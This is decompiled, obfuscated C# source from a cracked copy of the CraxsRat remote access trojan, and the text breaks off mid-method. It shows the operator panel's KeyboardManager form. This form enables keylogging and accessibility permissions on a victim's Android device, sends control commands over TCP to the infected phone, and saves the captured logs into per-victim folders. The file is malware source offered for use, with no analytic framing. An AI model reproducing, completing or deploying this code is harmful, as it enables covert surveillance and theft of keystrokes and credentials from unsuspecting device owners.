// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.KeyboardManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class KeyboardManager : Form
  {
    public static byte f0050A9;
    private string N_cap_sc_;
    public static byte f0050AB;
    private string N_update_app_;
    public static byte f0050AD;
    private string N_WackMeUpJob;
    public static byte f0050AF;
    private string N_ClassGen;
    public static byte f0050B1;
    private string N__ask_draw_;
    public static byte f0050B3;
    private string N__ask_battary_;
    public static byte f0050B5;
    private string N__CamActivity_;
    public static byte f0050B7;
    private string N__SCRActivity_;

    internal virtual Panel Panel1
    {
      get => ((PermissionsManager) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._Panel1 = value;
      }
    }

    internal virtual DrakeUIButtonIcon checkbutton
    {
      get => ((PermissionsManager) this)._checkbutton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
label_1:
        int num1 = 1120785381;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon checkbutton;
          switch ((num3 = (uint) ~~(996152735 * (1842828738 ^ 116603342) - -num2)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              checkbutton = ((PermissionsManager) this)._checkbutton;
              num1 = (int) num3 * -30640201 ^ -1724753458;
              continue;
            case 2:
              int num4 = checkbutton == null ? 1295915511 : (num4 = -324937644);
              num1 = num4 ^ (int) num3 * 745410494;
              continue;
            case 3:
              checkbutton.Click -= eventHandler;
              num1 = (int) num3 * -547133819 ^ -1190003907;
              continue;
            case 4:
              checkbutton.Click += eventHandler;
              num1 = (int) num3 * 1732543701 ^ -243235449;
              continue;
            case 5:
              int num5 = checkbutton == null ? 1600562833 : (num5 = 1919556780);
              num1 = num5 ^ (int) num3 * 333118919;
              continue;
            case 6:
              ((PermissionsManager) this)._checkbutton = value;
              checkbutton = ((PermissionsManager) this)._checkbutton;
              num1 = 1063107294;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label4
    {
      get => ((PermissionsManager) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._Label4 = value;
      }
    }

    internal virtual Label Label3
    {
      get => ((PermissionsManager) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._Label3 = value;
      }
    }

    internal virtual Label acttext
    {
      get => ((PermissionsManager) this)._acttext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._acttext = value;
      }
    }

    internal virtual Label primtext
    {
      get => ((PermissionsManager) this)._primtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._primtext = value;
      }
    }

    internal virtual TextBox statustext
    {
      get => ((PermissionsManager) this)._statustext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._statustext = value;
      }
    }

    internal virtual Label Label5
    {
      get => ((PermissionsManager) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._Label5 = value;
      }
    }

    internal virtual Label montext
    {
      get => ((PermissionsManager) this)._montext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((PermissionsManager) this)._montext = value;
      }
    }

    internal virtual DrakeUIButtonIcon savebutton
    {
      get => ((PermissionsManager) this)._savebutton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
        DrakeUIButtonIcon savebutton = ((PermissionsManager) this)._savebutton;
label_1:
        int num1 = 199985821;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-87483867 - (-num2 + (-(-540870240 ^ 552831889 ^ 1127517967 - -1050129423) + (~~513708466 + -(-2044767079 * -372709151))) + ((905423233 * 1432983129 ^ -1895092759 ^ -1637257191) - (452051083 - -1886809155 + 1446679492))) * 975407421 * 864713325)) % 7U)
          {
            case 0:
              savebutton.Click -= eventHandler;
              num1 = (int) num3 * -850585852 ^ -1556119575;
              continue;
            case 1:
              int num4 = savebutton == null ? -242507719 : (num4 = -1268100986);
              num1 = num4 ^ (int) num3 * -1454239560;
              continue;
            case 2:
              ((PermissionsManager) this)._savebutton = value;
              savebutton = ((PermissionsManager) this)._savebutton;
              num1 = 1136586307;
              continue;
            case 3:
              int num5 = savebutton == null ? -1138296265 : (num5 = -1246781115);
              num1 = num5 ^ (int) num3 * -1821575787;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            case 6:
              savebutton.Click += eventHandler;
              num1 = (int) num3 * 1483610885 ^ 1864068126;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((ScreenLoger) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ScreenLoger) this)._Panel2 = value;
    }

    internal virtual DrakeUICheckBox checkenable
    {
      get => ((ScreenLoger) this)._checkenable;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkenable_MouseClick);
label_1:
        int num1 = -2010407991;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUICheckBox checkenable;
          switch ((num3 = (uint) ((~(~~(2116755808 - 542339940 - 1605583395 * -1334103430) - (num2 - 1032808145 * ~350855583)) + -(532705122 ^ -548104063)) * 1242185703 * -38198531)) % 8U)
          {
            case 0:
              ((ScreenLoger) this)._checkenable = value;
              checkenable = ((ScreenLoger) this)._checkenable;
              num1 = 267043965;
              continue;
            case 1:
              int num4 = checkenable == null ? -1638790237 : (num4 = 499239799);
              num1 = num4 ^ (int) num3 * 173422576;
              continue;
            case 2:
              int num5 = checkenable == null ? 1295099298 : (num5 = -1341377172);
              num1 = num5 ^ (int) num3 * 1245231252;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              checkenable = ((ScreenLoger) this)._checkenable;
              num1 = (int) num3 * -292801652 ^ 938524180;
              continue;
            case 6:
              checkenable.MouseClick -= mouseEventHandler;
              num1 = (int) num3 * 1577853817 ^ 1207107068;
              continue;
            case 7:
              checkenable.MouseClick += mouseEventHandler;
              num1 = (int) num3 * 924625180 ^ -56680681;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUICheckBox checkselected
    {
      get => ((ScreenReader) this)._checkselected;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkselected_MouseClick);
label_1:
        int num1 = 792428735;
        DrakeUICheckBox checkselected;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 * -1375677001 - ~(1099553433 - -1279053842 * 1195585955 * 525347585))) % 9U)
          {
            case 0:
              checkselected.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 2031448838 ^ 472720228;
              continue;
            case 1:
              checkselected = ((ScreenReader) this)._checkselected;
              num1 = (int) num2 * -1680916144 ^ -1246007656;
              continue;
            case 2:
              int num3 = checkselected == null ? -1487270246 : (num3 = 774325594);
              num1 = num3 ^ (int) num2 * 402350219;
              continue;
            case 3:
              checkselected = ((ScreenReader) this)._checkselected;
              num1 = (int) num2 * -1679995628 ^ 249376285;
              continue;
            case 4:
              checkselected.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -2029434003 ^ -6407401;
              continue;
            case 5:
              int num4 = checkselected == null ? -1135907822 : (num4 = 535972788);
              num1 = num4 ^ (int) num2 * 1906175909;
              continue;
            case 6:
              goto label_3;
            case 7:
              goto label_1;
            case 8:
              ((ScreenReader) this)._checkselected = value;
              num1 = -864586064;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUICheckBox checkkeypermission
    {
      get => ((ScreenReader) this)._checkkeypermission;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Checkkeypermission_MouseClick);
        DrakeUICheckBox checkkeypermission = ((ScreenReader) this)._checkkeypermission;
        if (checkkeypermission == null)
          goto label_5;
label_1:
        int num1 = 974937151;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((-num1 ^ ~((-38633512 - 1303077717) * 1777721035 * -1599661309)) * 741743515 * 1814938751) - 1141510260)) % 6U)
          {
            case 0:
              checkkeypermission.MouseClick += mouseEventHandler;
              num1 = (int) num2 * 356016261 ^ -1645587475;
              continue;
            case 1:
              goto label_5;
            case 2:
              checkkeypermission = ((ScreenReader) this)._checkkeypermission;
              int num3 = checkkeypermission == null ? 746292513 : (num3 = -2101439044);
              num1 = num3 ^ (int) num2 * -748259507;
              continue;
            case 3:
              checkkeypermission.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * 725839813 ^ 729682252;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((ScreenReader) this)._checkkeypermission = value;
        num1 = 96226604;
        goto label_2;
      }
    }

    public void CraxsStyle()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u0036A5D606D, false) == 0)
        goto label_4;
label_1:
      int num1 = -1654712241;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 ^ -615431047 * (-~(-1944165200 - 1071492877) + 1155148284 * 742961011) ^ --390551269) * -259230983)) % 11U)
        {
          case 0:
            goto label_3;
          case 1:
            this.checkbutton.Text = EXGuarder.\u003554F2B26;
            this.savebutton.Text = EXGuarder.\u00343731F74;
            num1 = (int) num2 * 1030224971 ^ 1601303633;
            continue;
          case 2:
            this.montext.Text = EXGuarder.\u00376314602;
            num1 = (int) num2 * -1450208547 ^ -273376964;
            continue;
          case 3:
            goto label_4;
          case 4:
            this.primtext.Text = EXGuarder.\u0030A251D31;
            this.acttext.Text = EXGuarder.\u00322233800;
            num1 = (int) num2 * -234003125 ^ 1056229810;
            continue;
          case 5:
            goto label_1;
          case 6:
            num1 = (int) num2 * 1334828609 ^ 1885692887;
            continue;
          case 7:
            this.savebutton.Text = EXGuarder.\u0031F0F526B;
            num1 = (int) num2 * -1809748933 ^ 2126457592;
            continue;
          case 8:
            this.primtext.Text = EXGuarder.\u0034E451C26;
            num1 = (int) num2 * -724181132 ^ 1544737184;
            continue;
          case 9:
            int num3 = Operators.CompareString(language, EXGuarder.\u00315011E66, false) != 0 ? -572802168 : (num3 = 1887829705);
            num1 = num3 ^ (int) num2 * -663254430;
            continue;
          case 10:
            this.acttext.Text = EXGuarder.\u00350635174;
            this.montext.Text = EXGuarder.\u00310532E1D;
            num1 = (int) num2 * 1335340505 ^ 2135923293;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:
      return;
label_4:
      this.checkbutton.Text = EXGuarder.\u0034C6C543A;
      num1 = -1597395782;
      goto label_2;
    }

    public KeyboardManager()
    {
label_1:
      int num1 = 683286154;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-~-10097100 + ~2105286183 - (num2 ^ ~(-1348020446 - 1436662068 ^ 1550913052 ^ -1002090423 ^ 1910798753 ^ 1100601846 ^ ~(1921911963 * 929942361 + 1923137770))) * 1042966553) * -140447185 * 521242075 ^ -634199716)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            this.CraxsStyle();
            num1 = (int) num3 * -382734350 ^ -2130481267;
            continue;
          case 2:
            this.FormClosing += new FormClosingEventHandler(this.KeyboardManager_FormClosing);
            // ISSUE: reference to a compiler-generated method
            ((Jector._Closure\u0024__287\u002D1) this).InitializeComponent();
            num1 = (int) num3 * -1897410213 ^ 431828791;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz(object[] obj)
    {
      if (!this.statustext.InvokeRequired)
        goto label_9;
label_1:
      int num1 = 1204767452;
label_2:
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 - -1919382021 * (-602278265 * ~(837024195 - 136515157) ^ 1267143268) - (-16953598 - (-692626395 * (37934067 - -289708920) + (2028664070 - 776390840 + 54261186))) ^ 1681857870) - (-945221810 - 1166336733) ^ -434753447)) % 8U)
        {
          case 0:
            this.statustext.AppendText(EXGuarder.\u0034C223952 + str + EXGuarder.\u00338212B51);
            num1 = (int) num2 * -1895386754 ^ -567388883;
            continue;
          case 1:
            // ISSUE: method pointer
            this.statustext.Invoke((Delegate) new KeyboardManager((object) this, __methodptr(CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz)), (object) obj);
            num1 = (int) num2 * -292560556 ^ 970262740;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          case 4:
            this.statustext.ScrollToCaret();
            num1 = (int) num2 * 819756683 ^ 1785619810;
            continue;
          case 5:
            num1 = (int) num2 * 938405251 ^ 265732681;
            continue;
          case 6:
            this.statustext.SelectionStart = this.statustext.Text.Length;
            num1 = (int) num2 * -2138452755 ^ -284230443;
            continue;
          case 7:
            goto label_9;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_9:
      str = Conversions.ToString(obj[0]);
      num1 = 623845703;
      goto label_2;
    }

    public void UpdatePrims(object[] obj)
    {
      if (!this.InvokeRequired)
        goto label_9;
label_1:
      int num1 = -883930481;
label_2:
      string[] strArray;
      KeyboardManager.recordnames method;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(~(num1 ^ ~((-1277070698 * 1405176999 ^ 1039206349 + 1653030889) + (1878964981 * -434684437 - ~924510805)) + ~(-(447310244 ^ 1711964200) ^ (-1359786249 - 1207582060) * 1569125273)) ^ -788657655 * (1359264592 ^ 1961298785) + -(1837947311 * 1132582613)) + (670768095 ^ -657073059) - -871722530)) % 14U)
        {
          case 0:
            this.checkselected.Enabled = true;
            num1 = (int) num2 * -107766986 ^ -1494185605;
            continue;
          case 1:
            num1 = (int) num2 * 1659030239 ^ -988680096;
            continue;
          case 2:
            this.Invoke((Delegate) method, (object) obj);
            num1 = (int) num2 * -109590652 ^ 471435493;
            continue;
          case 3:
            goto label_3;
          case 4:
            this.checkselected.Checked = true;
            this.checkselected.Enabled = false;
            this.statustext.AppendText(EXGuarder.\u003576D0A40);
            num1 = (int) num2 * 1638705009 ^ 1708157513;
            continue;
          case 5:
            method = (KeyboardManager.recordnames) new KeyboardManager.updatedele(this.UpdatePrims);
            num1 = (int) num2 * 1680706382 ^ 992460606;
            continue;
          case 6:
            this.checkkeypermission.Checked = false;
            this.checkkeypermission.Enabled = true;
            num1 = -905793290;
            continue;
          case 7:
            num1 = (int) num2 * -1308319000 ^ 1050754271;
            continue;
          case 8:
            this.checkselected.Checked = false;
            num1 = 228106006;
            continue;
          case 9:
            this.checkkeypermission.Checked = true;
            this.checkkeypermission.Enabled = false;
            this.statustext.AppendText(EXGuarder.\u003506B3C69);
            num1 = (int) num2 * -73456592 ^ 315020198;
            continue;
          case 10:
            int num3;
            num1 = num3 = Operators.CompareString(strArray[1], EXGuarder.\u003103D3E4B, false) != 0 ? -519201842 : (num3 = 1990597202);
            continue;
          case 11:
            goto label_9;
          case 12:
            goto label_1;
          case 13:
            int num4 = Operators.CompareString(strArray[0], EXGuarder.\u003103D3E4B, false) != 0 ? -979481401 : (num4 = 203312580);
            num1 = num4 ^ (int) num2 * -265210065;
            continue;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:
      return;
label_9:
      strArray = (string[]) obj[0];
      this.statustext.Text = EXGuarder.\u00379230E48;
      num1 = 161062565;
      goto label_2;
    }

    private void Checkenable_MouseClick(object sender, MouseEventArgs e)
    {
      if (!(this.checkkeypermission.Enabled | this.checkselected.Enabled))
        goto label_9;
label_1:
      int num1 = 1175676080;
label_2:
      TcpClient client1;
      object[] ParametersObjects1;
      object[] ParametersObjects2;
      TcpClient client2;
      string[] strArray1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((-num1 - (-538086796 - 1716779542 + 789901364 + 452970485 * (-1025900705 - 440044320) + -1770936241 * (1901780540 - 405549930 - -1182108188)) + ----861534753) * -150288405) ^ -1086109559)) % 15U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            client1 = ((Data._Closure\u0024__) ((ScreenReader) this).Classclient).myClient;
            num1 = (int) num2 * -595902712 ^ 667384169;
            continue;
          case 1:
            string[] strArray2 = ((Data) ((ScreenReader) this).Classclient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects1 = new object[4]
            {
              (object) client1,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035D082674 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenReader) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00312465261),
              (object) ((ScreenReader) this).Classclient
            };
            num1 = (int) num2 * 122411758 ^ -60075933;
            continue;
          case 2:
            int num3;
            num1 = num3 = ((ScreenReader) this).Classclient == null ? -859358547 : (num3 = -2765377);
            continue;
          case 3:
            goto label_1;
          case 4:
            // ISSUE: reference to a compiler-generated field
            client2 = ((Data._Closure\u0024__) ((ScreenReader) this).Classclient).myClient;
            num1 = (int) num2 * -439796562 ^ -1861113908;
            continue;
          case 5:
            int num4 = ((ScreenReader) this).Classclient == null ? -1274827530 : (num4 = 903245232);
            num1 = num4 ^ (int) num2 * 990018119;
            continue;
          case 6:
            this.checkenable.Checked = false;
            num1 = (int) num2 * 176315814 ^ -47747071;
            continue;
          case 7:
            strArray1 = ((Data) ((ScreenReader) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1198665421 ^ -41427927;
            continue;
          case 8:
            goto label_3;
          case 9:
            CraxsAlert.Showinformation(EXGuarder.\u00315294C3F);
            num1 = (int) num2 * -1446623322 ^ 1418684433;
            continue;
          case 10:
            num1 = (int) num2 * 634487782 ^ -959704891;
            continue;
          case 11:
            ((ScreenReader) this).Classclient.SendMessage(ParametersObjects2);
            num1 = (int) num2 * -1266418051 ^ -112943529;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) client2,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003591E005D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenReader) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00312465261),
              (object) ((ScreenReader) this).Classclient
            };
            num1 = (int) num2 * 2052864283 ^ 175539734;
            continue;
          case 13:
            goto label_9;
          case 14:
            ((ScreenReader) this).Classclient.SendMessage(ParametersObjects1);
            num1 = (int) num2 * -1072244670 ^ 985861177;
            continue;
          default:
            goto label_17;
        }
      }
label_3:
      return;
label_17:
      return;
label_9:
      num1 = !this.checkenable.Checked ? -774609885 : (num1 = 1367022366);
      goto label_2;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (((ScreenReader) this).Classclient == null)
        return;
label_1:
      int num1 = -1135433260;
      TcpClient client;
      object[] ParametersObjects;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~num1 - 1064518189 * -(717367107 ^ -2016741439))) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            strArray = ((Data) ((ScreenReader) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * 336360098 ^ 1330629873;
            continue;
          case 2:
            ((ScreenReader) this).Classclient.SendMessage(ParametersObjects);
            num1 = (int) num2 * 787491385 ^ 652779092;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenReader) this).Classclient).myClient;
            num1 = (int) num2 * -1717176727 ^ -548963319;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003456D3731 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenReader) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003361E6B2E),
              (object) ((ScreenReader) this).Classclient
            };
            num1 = (int) num2 * 1638599760 ^ 1203553689;
            continue;
          case 5:
            goto label_8;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void Checkkeypermission_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkkeypermission.Enabled)
        return;
label_1:
      int num1 = -421545267;
      string[] strArray;
      TcpClient client;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(~num1 * -1481397897) ^ -1779680655)) % 6U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenReader) this).Classclient).myClient;
            num1 = (int) num2 * -993421476 ^ -812150480;
            continue;
          case 1:
            int num3 = ((ScreenReader) this).Classclient == null ? 1677061338 : (num3 = 1756169723);
            num1 = num3 ^ (int) num2 * 1384201023;
            continue;
          case 2:
            strArray = ((Data) ((ScreenReader) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -27670149 ^ 114971697;
            continue;
          case 3:
            goto label_8;
          case 4:
            goto label_1;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenReader) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003230F7542 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenReader) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0030971682C),
              (object) ((ScreenReader) this).Classclient
            });
            num1 = (int) num2 * -1225045924 ^ -1930387073;
            continue;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void Checkselected_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkselected.Enabled)
        return;
label_1:
      int num1 = 1229712589;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((~((num1 ^ 1569743708 + -(-1586575643 - 2143430458) - ~(850728943 * -654186148 + 760781209) + ~(938763684 - 1618430935 + (310728410 + 756355976) - -(-1917018199 - 207485923))) - (-1443930429 - 1947248032)) ^ --1511180898) + -459005614 * -1330685641)) % 5U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenReader) this).Classclient).myClient;
            strArray = ((Data) ((ScreenReader) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1768124248 ^ -1845192505;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenReader) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003353F511A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenReader) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00329584224),
              (object) ((ScreenReader) this).Classclient
            });
            num1 = (int) num2 * 1093479230 ^ -256150055;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_7;
          case 4:
            int num3 = ((ScreenReader) this).Classclient == null ? 261465193 : (num3 = 1202725966);
            num1 = num3 ^ (int) num2 * 1671536556;
            continue;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrEmpty(this.statustext.Text))
      {
label_1:
        int num1 = -2080958109;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -((720899013 ^ -507254632) - ~(-num2 - (-(-991982579 * 1177216321 ^ ~-999434873) - (646675679 * 2105079527 - (1964304533 - -792392213) ^ 1374565113 - 1604515716))) * -682563819)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_9;
            case 2:
              CraxsAlert.Showinformation(EXGuarder.\u0035E52110D);
              num1 = (int) num3 * -194819537 ^ 1063690210;
              continue;
            default:
              goto label_5;
          }
        }
label_9:
        return;
label_5:;
      }
      else
      {
        try
        {
          // ISSUE: reference to a compiler-generated field
          if (Directory.Exists(((Data._Closure\u0024__39\u002D12) ((ScreenReader) this).Classclient).FolderUSER + EXGuarder.\u003654B3B1D))
            goto label_15;
label_7:
